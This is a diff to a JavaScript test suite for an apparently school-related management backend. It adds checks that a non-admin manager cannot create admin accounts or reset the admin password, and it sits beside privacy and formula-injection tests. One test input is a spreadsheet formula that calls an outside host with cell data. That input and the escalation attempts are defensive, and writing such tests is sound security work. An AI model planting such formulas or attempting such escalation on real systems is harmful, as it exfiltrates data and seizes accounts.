@@ -196,6 +196,16 @@ r=post({action:'nutritionAck',token:tn});assert(r.success&&r.ack.current,'nutrit
 r=post({action:'nutritionSummary',token:tl});assert(r.ack&&r.ack.current&&r.ack.by==='تغذية'&&!r.allergies,'leader sees WHO confirmed and when, never the names');
 
 for(const a of ['roster','lookup','printList','leaderSummary','history','custodySummary']){const rr=JSON.stringify(post({action:a,token:T,q:'أحمد',studentId:'1001'}));assert(!rr.includes('ربو')&&!rr.includes('سكري')&&!rr.includes('فول سوداني'),'no medical/allergy data leaks via '+a);}
+// ---- privilege escalation: a non-admin manager cannot become (or take over) an admin
+{post({action:'createUser',token:T,username:'mgr1',password:'pm-12345',fullName:'مدير مستخدمين',role:'supervisor',permissions:['manage'],committees:[]});
+const tm1=post({action:'login',username:'mgr1',password:'pm-12345'}).token;
+let q=post({action:'createUser',token:tm1,username:'evil1',password:'pe-12345',fullName:'x',role:'admin',committees:[]});assert(!q.success&&q.code==='ADMIN_ONLY','manager cannot create an admin account');
+q=post({action:'createUser',token:tm1,username:'evil2',password:'pe-12345',fullName:'x',role:'supervisor',permissions:['*'],committees:[]});assert(!q.success&&q.code==='ADMIN_ONLY','manager cannot create a "*" account');
+q=post({action:'resetPassword',token:tm1,targetUsername:'Admin',newPassword:'hacked-123'});assert(!q.success&&q.code==='ADMIN_ONLY','manager cannot reset the admin password');
+assert(post({action:'login',username:'Admin',password:'pw-12345'}).success,'admin password unchanged');
+q=post({action:'createUser',token:tm1,username:'okuser',password:'po-12345',fullName:'عادي',role:'supervisor',permissions:['checkin'],assignedBus:'1',committees:[]});assert(q.success,'manager still creates normal users');
+q=post({action:'resetPassword',token:tm1,targetUsername:'okuser',newPassword:'po-99999'});assert(q.success,'manager still resets normal users');
+q=post({action:'createUser',token:T,username:'admin2',password:'pa-12345',fullName:'مدير ثانٍ',role:'admin',committees:[]});assert(q.success,'the admin can still create an admin');}
 // ---- formula injection: every user-typed text is stored as plain text, never as a formula
 {FORMULAS.length=0;const F='=IMPORTXML("http://x/?"&A1,"//a")',tk=post({action:'login',username:'sup1',password:'p1-12345'}).token;
 post({action:'createCase',token:tk,type:'other',text:F,studentId:'@x',clientId:'+cid1'});
